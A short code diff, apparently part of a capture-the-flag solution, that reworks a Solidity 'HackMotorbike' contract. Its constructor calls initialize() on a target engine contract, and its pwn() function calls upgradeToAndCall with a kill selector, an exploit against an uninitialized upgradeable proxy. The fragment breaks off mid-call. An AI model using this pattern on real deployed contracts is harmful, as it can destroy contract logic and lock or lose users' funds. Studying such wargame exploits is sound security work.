@@ -10,8 +10,13 @@ interface IEngine {
 }
 
 contract HackMotorbike {
-    function pwn(IEngine target) external {
+    IEngine target;
+    constructor (address _target) external {
+        target = IEngine(_target);
         target.initialize();
+    }
+
+    function pwn() external {
         target.upgradeToAndCall(
             address(this),
             abi.encodeWithSelector(this.kill.selector)
